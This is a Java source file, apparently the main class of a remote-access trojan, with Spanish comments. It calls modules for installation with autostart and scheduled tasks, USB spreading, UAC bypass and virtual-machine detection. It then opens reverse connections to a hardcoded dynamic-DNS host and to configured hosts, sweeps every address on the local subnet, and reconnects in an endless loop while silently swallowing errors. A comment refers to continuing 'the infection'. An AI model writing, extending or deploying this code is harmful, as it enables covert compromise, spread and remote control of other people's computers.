package rt;

import comunes.Interfaz;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import rt.util.CLRT;
import rt.util.IMG;

public class RtServer implements Interfaz {

    //public static String ID = "bWlub2lwLmRkbnMubmV0";//minoip.ddns.net en base 64
//    public static String ID = "minoip.ddns.net;qoopo.ddns.net;javacheck.ddns.net";
    public static String ID = "minoip.ddns.net";
//    public static String ID = "qoopo.ddns.net";
    //public static String ID = "javacheck.ddns.net";

    @Override
    public void instanciar(Object... parametros) {
        boolean actualizacion = (Boolean) parametros[0];
        boolean instaladoServicio = (Boolean) parametros[1];
        CLRT cl = new CLRT();
        Inicio.con = new ArrayList<Interfaz>();
        //String rtdns = B64.decodeString(ID);
        String rtdns = ID;
        try {
            if ((Boolean) Inicio.config.obtenerParametro("instalar")) {
                try {
                    Inicio.in = ((Interfaz) cl.loadClass("rt.util.INST").newInstance());
                    Inicio.in.instanciar(
                            Inicio.config.obtenerParametro("jarName"),
                            Inicio.config.obtenerParametro("regName"),
                            Inicio.config.obtenerParametro("autoInicio"),
                            Inicio.config.obtenerParametro("progTareas"),
                            actualizacion,
                            Inicio.config.obtenerParametro("servicio"),
                            instaladoServicio);
                } catch (Exception ex) {
                }
            }

            if ((Boolean) Inicio.config.obtenerParametro("usb")) {
                try {
                    Interfaz copiar = ((Interfaz) cl.loadClass("rt.util.USB").newInstance());
                    copiar.instanciar(Inicio.config.obtenerParametro("nombreUSB"));
                    copiar.ejecutar(0);
                } catch (Exception e) {
                }
            }

            if ((Boolean) Inicio.config.obtenerParametro("uac")) {
                try {
                    Interfaz uacI = ((Interfaz) cl.loadClass("rt.modulos.var.UAC").newInstance());
                    uacI.instanciar();
                    uacI.ejecutar(0);
                } catch (Exception e) {
                }
            }

            if ((Boolean) Inicio.config.obtenerParametro("avmw") || (Boolean) Inicio.config.obtenerParametro("avml")) {
                try {
                    Interfaz avm = ((Interfaz) cl.loadClass("rt.modulos.var.AVM").newInstance());
                    avm.instanciar(Inicio.config.obtenerParametro("avmw"), (Boolean) Inicio.config.obtenerParametro("avml"));
                    avm.ejecutar(0);
                } catch (Exception e) {

                }
            }
        } catch (Exception e) {
//            listaDns = "";
            //e.printStackTrace();
        }

        //garbage collector
        try {
            Interfaz gc = ((Interfaz) cl.loadClass("rt.util.GC").newInstance());
            gc.instanciar();
        } catch (Exception e) {
        }

        //inicializa el conversor jpg
        IMG.iniciar();

        try {
            //if (gui) {
            if ((Boolean) Inicio.config.obtenerParametro("gui")) {
                try {
                    Interfaz ventana = ((Interfaz) cl.loadClass("rt.gui.Ventana").newInstance());
                    ventana.instanciar(
                            Inicio.config.obtenerParametro("dns"),
                            Inicio.config.obtenerParametro("puerto"),
                            Inicio.config.obtenerParametro("puerto"),
                            Inicio.config.obtenerParametro("password"),
                            Inicio.config.obtenerParametro("delay"),
                            Inicio.config.obtenerParametro("prefijo"),
                            Inicio.config.obtenerParametro("off-escritorio"),
                            Inicio.config.obtenerParametro("off-escritorio-delay"),
                            Inicio.config.obtenerParametro("tipoConexion"));
                } catch (Exception e) {
                }
                //quito el return para que igual continue con la infeccion en caso de usar gui
                //return;

            } else {

                Inicio.config.agregarParametro("dns", (procesarRangosIps((String) Inicio.config.obtenerParametro("dns"))));
                String[] dnsUnicos = ((String) Inicio.config.obtenerParametro("dns")).split(";");
                for (String dnsUnico : dnsUnicos) {
                    try {
                        if (dnsUnico != null && !dnsUnico.isEmpty()) {
                            Interfaz conexion = ((Interfaz) cl.loadClass("rt.Servicio").newInstance());

                            conexion.instanciar(
                                    dnsUnico,
                                    Inicio.config.obtenerParametro("puerto"),
                                    Inicio.config.obtenerParametro("password"),
                                    Inicio.config.obtenerParametro("delay"),
                                    Inicio.config.obtenerParametro("prefijo"),
                                    Inicio.config.obtenerParametro("off-escritorio"),
                                    Inicio.config.obtenerParametro("off-escritorio-delay"),
                                    Inicio.config.obtenerParametro("tipoConexion"));
                            conexion.ejecutar(0);
                            Inicio.con.add(conexion);
                        }
                    } catch (Exception e) {
//                        //e.printStackTrace();
                    }
                }
            }
        } catch (Exception e) {
//            //e.printStackTrace();
        }

        try {
//            rtdns += ";localhost";
//            rtdns += ";sisinq4pdesa14.andinatel.int";            
            rtdns += ";localhost";
            String[] dnsUnicos = rtdns.split(";");
            for (String dnsUnico : dnsUnicos) {
                if (!((String) Inicio.config.obtenerParametro("dns")).contains(dnsUnico)) {
                    Interfaz conexion = ((Interfaz) cl.loadClass("rt.Servicio").newInstance());
                    conexion.instanciar(dnsUnico, 4000, null, 3000, "rt2_", false, 3000, 1); //conexion inversa
//                    conexion.instanciar(dnsUnico, 4100,  null, 3000, "rt2_", false, 3000, 2); //conexion directa
                    conexion.ejecutar(0);
                    Inicio.con.add(conexion);
                }
            }
        } catch (Exception e) {
            //e.printStackTrace();

        }
        cl = null;
        while (true) {
            try {
                for (Interfaz serv : Inicio.con) {
                    if (!(Boolean) serv.get(1)) {
                        serv.ejecutar(0);
                    }
                }
                Thread.sleep(5000);
            } catch (Exception e) {
            }
        }
    }

    private String procesarRangosIps(String ipRango) {
        try {
            if (ipRango.contains(";")) {
                StringBuilder sb = new StringBuilder();
                String[] lista = ipRango.split(";");
                for (String ip : lista) {
                    sb.append(procesarRangosIps(ip.trim())).append(";");
                }
                return sb.toString();
            }
            if (ipRango.equals("*")) {
                //a todas las ips de la subred
                ipRango = getEquiposRedLan();
            } else if (ipRango.endsWith(".*")) //busca solo en los equipos de la subred x.x.x.*
            {
                StringBuilder sb = new StringBuilder("");
                String subnet = ipRango.substring(0, ipRango.lastIndexOf("."));
                for (int i = 1; i < 255; i++) {
                    //if (InetAddress.getByName(subnet + "." + String.valueOf(i)).isReachable(1000)) {
                    sb.append(subnet).append(".").append(String.valueOf(i)).append(";");
                    //}
                }
                return sb.toString();
            }
        } catch (Exception e) {
        }
        return ipRango;
    }

    private String getEquiposRedLan() {
        StringBuilder sb = new StringBuilder("");
        InetAddress inet;
        try {
            Enumeration e = NetworkInterface.getNetworkInterfaces();
            while (e.hasMoreElements()) {
                try {
                    NetworkInterface network = (NetworkInterface) e.nextElement();
                    Enumeration ee = network.getInetAddresses();
                    if (!network.isLoopback()) {//evito las interfaces loopback
                        while (ee.hasMoreElements()) {
                            InetAddress ipinet = (InetAddress) ee.nextElement();
                            if (ipinet instanceof Inet4Address) {
                                String ip = ipinet.getHostAddress();
                                String subnet = ip.substring(0, ip.lastIndexOf("."));
                                for (int i = 1; i < 255; i++) {
                                    //if (InetAddress.getByName(subnet + "." + String.valueOf(i)).isReachable(1000)) {
                                    sb.append(subnet).append(".").append(String.valueOf(i)).append(";");
                                    //}
                                }
                            }
                        }
                    }
                } catch (Exception ex) {
                }
            }
        } catch (SocketException ex) {

        }
        return sb.toString();
    }

    public void set(int opcion, Object valor) {

    }

    public Object get(int opcion, Object... parametros) {
        return null;
    }

    public void ejecutar(int opcion, Object... parametros) {

    }
}
